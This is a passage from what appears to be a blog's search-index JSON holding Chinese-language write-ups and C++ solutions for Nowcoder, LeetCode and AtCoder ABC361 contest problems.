}","date":"2024-07-13","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/:5:0","tags":["算法"],"title":"牛客小白月赛98","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B98/"},{"categories":["算法和数据结构"],"content":"A.三角形\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; int a[110]; int main(){ int n; cin \u003e\u003e n; int flag = 0; for(int i = 1; i \u003c= n; i++) { int tmp; cin \u003e\u003e tmp; a[tmp]++; if(a[tmp] \u003e= 3) flag = 1; } if(flag) cout \u003c\u003c \"YES\"; else cout \u003c\u003c \"NO\"; return 0; }","date":"2024-07-10","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/:1:0","tags":["算法"],"title":"牛客小白月赛97","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/"},{"categories":["算法和数据结构"],"content":"B.好数组\r看有没有0就行 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int n; cin \u003e\u003e n; int flag = 0; for(int i = 1; i \u003c= n; i++){ int tmp; cin \u003e\u003e tmp; if(tmp == 0){ flag = 1; } } if(!flag) cout \u003c\u003c \"YES\"; else cout \u003c\u003c \"NO\"; return 0; }","date":"2024-07-10","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/:2:0","tags":["算法"],"title":"牛客小白月赛97","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/"},{"categories":["算法和数据结构"],"content":"C.前缀平方和序列\r求组合数。 找到x以内的平方数，按升序排列。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; const ll mod = 1e9 + 7; ll fact[1000010]; ll n, x; ll ans = 0; ll ksm(ll a, ll b){ ll res = 1; while(b){ if(b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } ll inv(ll a){ return ksm(a, mod - 2); } int main(){ fact[0] = 1; ll cnt = 0; cin \u003e\u003e n \u003e\u003e x; for(ll i = 1; i * i \u003c= 1e6; i++){ if(i * i \u003c= x) cnt++; } //cout \u003c\u003c cnt \u003c\u003c '\\n'; for(ll i = 1; i \u003c= cnt; i++){ fact[i] = fact[i - 1] * i % mod; } if(cnt \u003c n){ cout \u003c\u003c 0; return 0; } ans = fact[cnt] * inv(fact[n]) % mod; ans = ans * inv(fact[cnt - n]) % mod; cout \u003c\u003c ans; return 0; }","date":"2024-07-10","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/:3:0","tags":["算法"],"title":"牛客小白月赛97","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/"},{"categories":["算法和数据结构"],"content":"D.走一个大整数迷宫\rbfs搜索得到答案 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[20][20]; const int M=10011; int st[20][20][M]; int dx[] = {-1, 1, 0 ,0}; int dy[] = {0, 0, -1, 1}; ll mod; struct node{ ll x, y, val; node(ll x, ll y, ll val){ this-\u003ex = x; this-\u003ey = y; this-\u003eval = val; } }; int main(){ ll n, m, p; cin \u003e\u003e n \u003e\u003e m \u003e\u003e p; mod = p - 1; if(p == 2){ cout \u003c\u003c n + m - 2 \u003c\u003c '\\n'; return 0; } for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++) cin \u003e\u003e a[i][j], a[i][j] %= mod; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++){ ll temp; cin \u003e\u003e temp; } queue\u003cstruct node\u003e que; int cnt = 0; que.push(node(1, 1, a[1][1])); st[1][1][a[1][1]] = 1; while(que.size()){ int len = que.size(); while(len--){ auto tmp = que.front(); que.pop(); int x = tmp.x, y = tmp.y, val = tmp.val; for(int i = 0; i \u003c 4; i++){ int xx = x + dx[i], yy = y + dy[i]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; int val1 = (val + a[xx][yy]) % mod; if(st[xx][yy][val1]) continue; st[xx][yy][val1] = 1; if(xx == n \u0026\u0026 yy == m \u0026\u0026 val1 == 0){ cout \u003c\u003c cnt + 1; return 0; } que.push(node(xx,yy,val1)); } } cnt++; } cout \u003c\u003c -1; return 0; } ","date":"2024-07-10","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/:4:0","tags":["算法"],"title":"牛客小白月赛97","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/"},{"categories":["算法和数据结构"],"content":"E.前缀和前缀最大值\rA类价值的最大、最小显然是数组降序、升序排列时的价值。不难发现A类价值是连续的，因此问题转移到如何快速求B类价值，上界显然就是正数的个数+1，下界则是负数全放前面，正数从小到大排列。由于B的值域很小，可以前缀和求出每个子数组中每个正数的个数。求下界时，只需要知道花费多少个正数将负数全部抵消即可。 #include \u003cbits/stdc++.h\u003e using namespace std; void solve() { int n; cin \u003e\u003e n; vector\u003cint\u003e a(n + 1), pre_neg(n + 1); vector\u003cvector\u003cint\u003e\u003e cnt_pos(n + 1, vector\u003cint\u003e(110)); for (int i = 1; i \u003c= n; i ++ ) { cin \u003e\u003e a[i]; if(a[i] \u003c 0) pre_neg[i] = pre_neg[i - 1] + a[i]; else pre_neg[i] = pre_neg[i - 1]; for (int j = 1; j \u003c= 100; j ++ ) { cnt_pos[i][j] = cnt_pos[i - 1][j] + (a[i] == j); } } int q; cin \u003e\u003e q; while (q -- ) { int l, r; cin \u003e\u003e l \u003e\u003e r; int mx = 0; for(int i = 1; i \u003c= 100; i++) mx += cnt_pos[r][i] - cnt_pos[l - 1][i]; int all = pre_neg[r] - pre_neg[l - 1]; int need = 0; for(int i = 1; i \u003c= 100; i++){ int cnt = cnt_pos[r][i] - cnt_pos[l - 1][i]; if(all + cnt * i \u003e= 0){ need += (abs(all)) / i; break; }else{ all += cnt * i; need += cnt; } } cout \u003c\u003c need + 1 \u003c\u003c '\\n'; } } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t = 1; // cin \u003e\u003e t; while (t--) { solve(); } }","date":"2024-07-10","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/:5:0","tags":["算法"],"title":"牛客小白月赛97","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/"},{"categories":["算法和数据结构"],"content":"F.parent 树上启发式合并\r保证所有询问的不同的字符串 T 的长度和不超过 10^4。说明不同字符串的长度是根号级别的，$\\sqrt{(10^4)}$。将询问离线后，按长度枚举字串，使用字符串哈希进行匹配并记录匹配次数，若匹配且次数刚好是询问的次数，则记录下这个答案。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef unsigned long long ull; const int N = 100010; ull h[N], p[N]; ull base = 131; map\u003cpair\u003cull, int\u003e, int\u003e mp;//存储答案 vector\u003cpair\u003cull, int\u003e \u003e ask;//离线询问 map\u003cull, set\u003cint\u003e \u003e has;//询问串的询问次数 map\u003cint, set\u003cull\u003e\u003e num;//按长度存询问串的哈希 int main(){ int n, q; cin \u003e\u003e n \u003e\u003e q; string s; cin \u003e\u003e s; p[0] = 1; for(int i = 1; i \u003c= n; i++){ h[i] = h[i - 1] * base + s[i - 1]; p[i] = p[i - 1] * base; } auto get = [\u0026](int l, int r){ return h[r] - h[l - 1] * p[r - l + 1]; }; auto get_hash = [\u0026](string tmp){ ull hs = 0; for(auto i : tmp) hs = hs * base + i; return hs; }; for(int i = 1; i \u003c= q; i++){ string tmp; int k; cin \u003e\u003e tmp \u003e\u003e k; auto hs = get_hash(tmp); ask.push_back({hs, k}); has[hs].insert(k); num[tmp.size()].insert(hs); } for(auto [len, st] : num){ map\u003cull,int\u003e ump; for(int i = len; i \u003c= n; i++){ ull myhash = get(i - len + 1, i); if(num[len].find(myhash) != num[len].end()){ ump[myhash]++; if(has[myhash].find(ump[myhash]) != has[myhash].end()){ mp[{myhash, ump[myhash]}] = i; } } } } for(auto [hs, k] : ask){ if(!mp[{hs,k}]){ cout \u003c\u003c -1 \u003c\u003c '\\n'; }else{ cout \u003c\u003c mp[{hs,k}] \u003c\u003c '\\n'; } } return 0; } ","date":"2024-07-10","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/:6:0","tags":["算法"],"title":"牛客小白月赛97","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E6%9C%88%E8%B5%9B97/"},{"categories":["算法和数据结构"],"content":"A.小红的整数自增\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; int ans = 0; int sum = a + b + c; ans = max(3 * a, max(3 * b, 3 * c)); cout \u003c\u003c ans - sum; return 0; }","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/:1:0","tags":["算法"],"title":"牛客周赛Round48","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/"},{"categories":["算法和数据结构"],"content":"B.小红的伪回文子串（easy）\r暴力即可 #include\u003cbits/stdc++.h\u003e using namespace std; int check(string tmp){ int temp = 0; int len = tmp.size(); for(int i = 0, j = len - 1; i \u003c j; i++, j--) if(tmp[i] != tmp[j]) temp++; return temp; } int main(){ string s; cin \u003e\u003e s; int ans = 0; int len = s.size(); for(int i = 2; i \u003c= len; i++){ for(int j = 0; j \u003c len - i + 1; j++){ string t = s.substr(j, i); ans += check(t); } } cout \u003c\u003c ans; return 0; }","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/:2:0","tags":["算法"],"title":"牛客周赛Round48","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/"},{"categories":["算法和数据结构"],"content":"C.小红的01串取反\r从一端开始拟合最后看最后一个元素相不相同。 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int n; cin \u003e\u003e n; string a, b; cin \u003e\u003e a \u003e\u003e b; vector\u003cint\u003e ans; for(int i = 0; i \u003c n - 1; i++){ if(a[i] != b[i]){ a[i] = b[i]; a[i + 1] = a[i + 1] == '1'?'0':'1'; ans.push_back(i); } } if(a[n - 1] != b[n - 1]){ cout \u003c\u003c -1; return 0; } cout \u003c\u003c ans.size() \u003c\u003c '\\n'; for(auto i : ans) cout \u003c\u003c i + 1 \u003c\u003c ' ' \u003c\u003c i + 2 \u003c\u003c '\\n'; return 0; }","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/:3:0","tags":["算法"],"title":"牛客周赛Round48","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/"},{"categories":["算法和数据结构"],"content":"D.小红的乘2除2\r特判一下n=2的情况。 然后暴力跑出来第一次操作每个数/2后的陡峭值减少值(称为贡献）。 然后考虑操作2，对第i位进行操作2，则有四种情况： 1.第一次操作不发生在第i位和与之相邻的位置 2.第一次操作发生在第i位 3.第一次操作发生在第i+1位 4.第一次操作发生在第i-1位 对于后三种操作，这两次操作的总贡献是 第一次操作的贡献+ 第二次操作的贡献（让相应位置的数/2后计算） 对于第一种操作，总贡献是 第一次操作中其他位置的最大贡献（这三位之外的最值） + 第二次操作的贡献 那么再处理其他位置的最大贡献就可以了。当最大值的个数超过3的时候，直接全部都是最大值就行。 小于三的时候对相邻位和自己的第一次贡献中存在最大值的位置单独计算一遍其他位置的最大贡献就行，最多跑九遍。 最后初始陡峭值减去总贡献的最大值就是答案。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[100010]; ll tag[100010]; ll n; ll mxx[100010]; ll check(int i){ ll tmp = a[i] * 2; ll t1 = abs(a[i] - a[i - 1]) + abs(a[i] - a[i + 1]); ll t2 = abs(tmp - a[i - 1]) + abs(tmp - a[i + 1]); ll ret = t1 - t2; ll mx = mxx[i]; ret = ret + mx; for(ll j = -1; j \u003c= 1; j++){ ll a_1 = a[i - 1], a0 = a[i], a1 = a[i + 1]; if(j == -1) a_1 /= 2; if(j == 0) a0 /= 2; if(j == 1) a1 /= 2; tmp = a0 * 2; t1 = abs(a0 - a_1) + abs(a0 - a1); t2 = abs(tmp - a_1) + abs(tmp - a1); ret = max(ret,t1 - t2 + tag[i + j]); } return ret; } ll check2(ll i){ ll tmp = a[i] * 2; ll t1 = abs(a[i] - a[i + 1]); ll t2 = abs(tmp - a[i + 1]); ll ret = t1 - t2; ll mx = mxx[i]; ret = ret + mx; for(ll j = 0; j \u003c= 1; j++){ ll a0 = a[i], a1 = a[i + 1]; if(j == 0) a0 /= 2; if(j == 1) a1 /= 2; tmp = a0 * 2; t1 = abs(a0 - a1); t2 = abs(tmp - a1); ret = max(ret,t1 - t2 + tag[i + j]); } return ret; } ll check3(ll i){ ll tmp = a[i] * 2; ll t1 = abs(a[i] - a[i - 1]); ll t2 = abs(tmp - a[i - 1]); ll ret = t1 - t2; ll mx = mxx[i]; ret = ret + mx; for(ll j = -1; j \u003c= 0; j++){ ll a_1 = a[i - 1], a0 = a[i]; if(j == -1) a_1 /= 2; if(j == 0) a0 /= 2; tmp = a0 * 2; t1 = abs(a0 - a_1); t2 = abs(tmp - a_1); ret = max(ret,t1 - t2 + tag[i + j]); } return ret; } int main(){ cin \u003e\u003e n; for(ll i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; if(n == 2){ ll ans = 1e18; for(ll i = 1; i \u003c= 2; i++) for(ll j = 1; j \u003c= 2; j++){ ll a1 = a[1], a2 = a[2]; if(i == 1) a1 /= 2; else a2 /= 2; if(j == 1) a1 *= 2; else a2 *= 2; ans = min(ans, abs(a1 - a2)); } cout \u003c\u003c ans; return 0; } ll ans = 0; for(ll i = 1; i \u003c n; i++) ans += abs(a[i] - a[i + 1]); tag[1] = abs(a[1] - a[2]) - abs(a[1] / 2 - a[2]); tag[n] = abs(a[n] - a[n - 1]) - abs(a[n] / 2 - a[n]); ll mx = 0; for(ll i = 2; i \u003c n; i++){ ll t1 = abs(a[i] - a[i - 1]) + abs(a[i] - a[i + 1]); ll t2 = abs(a[i] / 2 - a[i - 1]) + abs(a[i] / 2 - a[i + 1]); tag[i] = t1 - t2; mx = max(mx, tag[i]); } ll cnt = 0; for(ll i = 1; i \u003c= n; i++)if(tag[i] == mx) cnt++; if(cnt \u003e 3){ for(ll i = 1; i \u003c= n; i++) mxx[i] = mx; }else{ for(ll i = 1; i \u003c= n; i++){ if(tag[i] == mx || tag[i - 1] == mx || tag[i + 1] == mx){ for(ll j = 1; j \u003c= n; j++){ if(abs(i - j) \u003c= 1) continue; mxx[i] = max(mxx[i], tag[j]); } }else mxx[i] = mx; } } ll op1 = -1e18; for(ll i = 2; i \u003c n; i++){ op1 = max(op1, check(i)); //cout \u003c\u003c check(i) \u003c\u003c '\\n'; } op1 = max(op1, check2(1)); op1 = max(op1, check3(n)); ans -= op1; cout \u003c\u003c ans; return 0; }​ ","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/:4:0","tags":["算法"],"title":"牛客周赛Round48","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-48/"},{"categories":["算法和数据结构"],"content":"A.小红的最小最大\r签到题 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; if(min(a,b) + c \u003e max(a,b)) puts(\"YES\"); else puts(\"NO\"); return 0; }","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/:1:0","tags":["算法"],"title":"牛客周赛Round50","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/"},{"categories":["算法和数据结构"],"content":"B.小红的四则运算（easy）\r特判全1的时候就行，也可以hard版的写法直接枚举操作符 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ int a[3]; cin \u003e\u003e a[0] \u003e\u003e a[1] \u003e\u003e a[2]; sort(a, a + 3); if(a[0] == 1){ if(a[1] == 1){ if(a[2] == 1){ cout \u003c\u003c 3; return 0; } } } if(a[0] == 1) cout \u003c\u003c (a[0] + a[1]) * a[2]; else cout \u003c\u003c a[0] * a[1] * a[2]; return 0; }","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/:2:0","tags":["算法"],"title":"牛客周赛Round50","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/"},{"categories":["算法和数据结构"],"content":"C.小红的四则运算（hard）\r暴力枚举操作符即可，注意有两种计算顺序。 #include\u003cbits/stdc++.h\u003e using namespace std; int op(int a, int b, int c){ if(c == 0) return a + b; if(c == 1) return a - b; if(c == 2) return a * b; return a / b; } int main(){ int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; int ans = 0; for(int i = 0; i \u003c 4; i++) for(int j = 0; j \u003c 4; j++){ int t1 = op(a, b, i); int t2 = op(t1, c, j); int t3 = op(b, c, i); int t4 = op(a, t3, j); ans = max(ans, t2); ans = max(ans, t4); } cout \u003c\u003c ans; return 0; }","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/:3:0","tags":["算法"],"title":"牛客周赛Round50","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/"},{"categories":["算法和数据结构"],"content":"D.小红的因式分解\r暴力枚举因子，然后计算是否满足条件即可。注意当C=0时的特判，以及因子正负情况。 #include\u003cbits/stdc++.h\u003e using namespace std; void solve(){ int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; if(c == 0){ cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c 0 \u003c\u003c ' ' \u003c\u003c a \u003c\u003c ' ' \u003c\u003c b \u003c\u003c '\\n'; return; } vector\u003cpair\u003cint,int\u003e\u003e pa, pb; int absc = c \u003c 0? -c:c; int absa = a \u003c 0? -a:a; for(int i = 1; i * i \u003c= absa; i++){ if(absa % i == 0){ if(a \u003e 0){ pa.push_back({i, absa / i}); pa.push_back({-1, -1 * absa / i}); }else{ pa.push_back({-i, absa / i}); pa.push_back({i, -1 * absa / i}); } } } for(int i = 1; i * i \u003c= absc; i++){ if(absc % i == 0){ if(c \u003e 0){ pb.push_back({i, absc / i}); pb.push_back({-i, -1 * absc / i}); }else{ pb.push_back({-i, absc / i}); pb.push_back({i, -1 * absc / i}); } } } for(auto [a1, a2]:pa) for(auto [b1, b2]:pb){ if(a1 * b1 + a2 * b2 == b){ cout \u003c\u003c a1 \u003c\u003c ' ' \u003c\u003c b2 \u003c\u003c ' ' \u003c\u003c a2 \u003c\u003c ' ' \u003c\u003c b1 \u003c\u003c '\\n'; return; } if(a1 * b2 + a2 * b1 == b){ cout \u003c\u003c a1 \u003c\u003c ' ' \u003c\u003c b1 \u003c\u003c ' ' \u003c\u003c a2 \u003c\u003c ' ' \u003c\u003c b2 \u003c\u003c '\\n'; return; } } cout \u003c\u003c \"NO\" \u003c\u003c '\\n'; } int main(){ int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; } //a = a1a2 //b = a1b2+a2b1 //c = b1b2 ","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/:4:0","tags":["算法"],"title":"牛客周赛Round50","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/"},{"categories":["算法和数据结构"],"content":"E.小红的树上移动\r题意相当于每次等概率走到下一层的任意一个节点，走到叶子节点则停下来。求走的次数的期望。 分析题意可知这题和树的结构无关，只要知道每一层节点个数和叶子节点的数量就可以了。 在第i层，前一层没停下来的概率为p，该层有x个叶子节点，y个节点数量。停下的概率是p*（x/y),继续走的概率是p * （1-x/y），注意一下求逆元就行。 #include\u003cbits/stdc++.h\u003e using namespace std; const int mod = 998244353; typedef long long ll; vector\u003cint\u003e g[1000010]; int dep[1000010]; int num[1000010]; int all[1000010]; void dfs(int x, int fa){ dep[x] = dep[fa] + 1; all[dep[x]]++; int cnt = 0; for(auto v : g[x]){ if(v == fa) continue; cnt++; dfs(v, x); } if(cnt == 0) num[dep[x]]++; } ll ksm(ll a, ll b){ ll res = 1; while(b){ if(b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } ll inv(ll a){ return ksm(a, mod - 2); } int main(){ ll n; cin \u003e\u003e n; for(int i = 1; i \u003c n; i++){ int u, v; cin \u003e\u003e u \u003e\u003e v; g[u].push_back(v); g[v].push_back(u); } dfs(1, 0); ll fenzi = 1; ll fenmu = 1; ll ans = 0; for(int i = 2; ; i++){ if(!all[i]) break; ll nzi = fenzi * num[i] % mod; nzi = nzi * (i - 1) % mod; fenmu = fenmu * all[i] % mod; fenzi = fenzi * (all[i] - num[i]) % mod; ans = (ans + nzi * inv(fenmu) % mod) % mod; } cout \u003c\u003c ans; return 0; } ","date":"2024-07-07","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/:5:0","tags":["算法"],"title":"牛客周赛Round50","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-50/"},{"categories":["算法和数据结构"],"content":"100336. 交替组 I\r枚举中点即可 class Solution { public: int numberOfAlternatingGroups(vector\u003cint\u003e\u0026 colors) { int len = colors.size(); int ans = 0; for(int i = 0; i \u003c colors.size(); i++){ if(colors[i] != colors[(i + 1) % len] \u0026\u0026 colors[i] != colors[(i + len - 1) % len]) ans++; } return ans; } };","date":"2024-07-07","objectID":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/:1:0","tags":["算法"],"title":"第 134 场双周赛","uri":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/"},{"categories":["算法和数据结构"],"content":"100182. 与敌人战斗后的最大分数\r注意操作一不会标记敌人，所以一直拿能量最低的敌人刷分就行，其他敌人全部吸收，注意初始能量小于最小能量的时候。 class Solution { public: long long maximumPoints(vector\u003cint\u003e\u0026 enemyEnergies, int currentEnergy) { long long ans = 0; int len = enemyEnergies.size(); long long mn = 1e18; long long sum = 0; for(int i = 0; i \u003c len; i++){ sum += enemyEnergies[i]; mn = min(mn, (long long)enemyEnergies[i]); } sum -= mn; sum += currentEnergy; if(currentEnergy \u003c mn) return 0LL; ans = sum / mn; return ans; } };","date":"2024-07-07","objectID":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/:2:0","tags":["算法"],"title":"第 134 场双周赛","uri":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/"},{"categories":["算法和数据结构"],"content":"100351. 交替组 II\r双指针跑一下就行 class Solution { public: int numberOfAlternatingGroups(vector\u003cint\u003e\u0026 colors, int k) { int ans = 0; int l = 0, r = 0; int len = colors.size(); while(l \u003c len){ while(l \u003c len \u0026\u0026 r - l + 1 \u003c k){ r++; if(colors[r % len] == colors[(r + len - 1) % len]){ l = r; } } if(l \u003e= len) break; ans++; l++; } return ans; } };","date":"2024-07-07","objectID":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/:3:0","tags":["算法"],"title":"第 134 场双周赛","uri":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/"},{"categories":["算法和数据结构"],"content":"100338. 子数组按位与值为 K 的数目\rdp枚举 class Solution { public: long long countSubarrays(vector\u003cint\u003e\u0026 nums, int k) { long long len = nums.size(); long long ans = 0; deque\u003cpair\u003clong long, long long\u003e\u003e que; for(auto i : nums){ int len = que.size(); unordered_map\u003clong long, long long\u003e mp; for(int j = 0; j \u003c len; j++){ auto [x, v] = que.front(); que.pop_front(); x = x \u0026 i; mp[x] += v; } mp[i]++; if(mp.find(k) != mp.end()) ans += mp[k]; for(auto [x, y] : mp) que.push_back({x,y}); } return ans; } };","date":"2024-07-07","objectID":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/:4:0","tags":["算法"],"title":"第 134 场双周赛","uri":"/posts/leetcode/%E7%AC%AC-134-%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B/"},{"categories":["算法和数据结构"],"content":"A - Insert\r签到 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n, k, x; cin \u003e\u003e n \u003e\u003e k \u003e\u003e x; vector\u003cint\u003e ans; for(int i = 1; i \u003c= n; i++){ int tmp; cin \u003e\u003e tmp; ans.push_back(tmp); if(i == k) ans.push_back(x); } for(auto i : ans) cout \u003c\u003c i \u003c\u003c ' '; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/atcoder/abc361/:1:0","tags":["算法"],"title":"abc361","uri":"/posts/atcoder/abc361/"},{"categories":["算法和数据结构"],"content":"B - Intesection of Cuboids\r检查是否相离即可 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int a, b, c, d, e, f; int g, h, i, j, k ,l; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c \u003e\u003e d \u003e\u003e e \u003e\u003e f; cin \u003e\u003e g \u003e\u003e h \u003e\u003e i \u003e\u003e j \u003e\u003e k \u003e\u003e l; int flag = 0; if(g \u003e= d || j \u003c= a) flag = 1; if(h \u003e= e || k \u003c= b) flag = 1; if(i \u003e= f || l \u003c= c) flag = 1; if(flag == 1) cout \u003c\u003c \"No\"; else cout \u003c\u003c \"Yes\"; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/atcoder/abc361/:2:0","tags":["算法"],"title":"abc361","uri":"/posts/atcoder/abc361/"},{"categories":["算法和数据结构"],"content":"C - Make Them Narrow\r去掉k个元素后集合的极差的最小值。 找极差和顺序无关，先排序。 去掉k个元素，相当于剩余n-k个元素，若固定最小值，则要使极差最小，应当保留从该最小值开始往后的n-k个元素。枚举最小值，求min(a[i + n - k - 1] - a[i])即可。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[200010]; void solve(){ int n, k; cin \u003e\u003e n \u003e\u003e k; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; sort(a + 1, a + 1 + n); ll ans = 1e18; for(int i = 1; i \u003c= k + 1; i++){ ll r = i + n - k - 1; ans = min(ans, a[r] - a[i]); } cout \u003c\u003c ans; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/atcoder/abc361/:3:0","tags":["算法"],"title":"abc361","uri":"/posts/atcoder/abc361/"},{"categories":["算法和数据结构"],"content":"D - Go Stone Puzzle\r注意到长度最大为14，尝试暴力枚举。 串中共有W、B、.三种字符，使用三进制存储状态。然后爆搜即可。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n; string s, t; cin \u003e\u003e n \u003e\u003e s \u003e\u003e t; n += 2; vector\u003cint\u003e p3(n + 1); p3[0] = 1; for(int i = 1; i \u003c= n; i++) p3[i] = p3[i - 1] * 3; vector\u003cint\u003e dist(p3[n], -1); vector\u003cint\u003e state(n); int init = 0; int goal = 0; for(int i = 0; i \u003c n; i++){ init = init * 3 + (i \u003c n - 2 ? (s[i] == 'W' ? 1 : 2) : 0); goal = goal * 3 + (i \u003c n - 2 ? (t[i] == 'W' ? 1 : 2) : 0); } vector\u003cint\u003e que(1, init); dist[init] = 0; for(int it = 0; it \u003c (int)(que.size()); it++){ int tmp = que[it]; for(int i = n - 1; i \u003e= 0; i--){ state[i] = tmp % 3; tmp /= 3; } int empty = (int)(find(state.begin(), state.end(), 0) - state.begin()); for(int i = 0; i \u003c n - 1; i++){ if(state[i] != 0 \u0026\u0026 state[i + 1] != 0){ auto new_state = state; swap(new_state[i], new_state[empty]); swap(new_state[i + 1], new_state[empty + 1]); int to = 0; for (int j = 0; j \u003c n; j++) { to = to * 3 + new_state[j]; } if (dist[to] == -1) { que.push_back(to); dist[to] = dist[que[it]] + 1; } } } } cout \u003c\u003c dist[goal] \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; 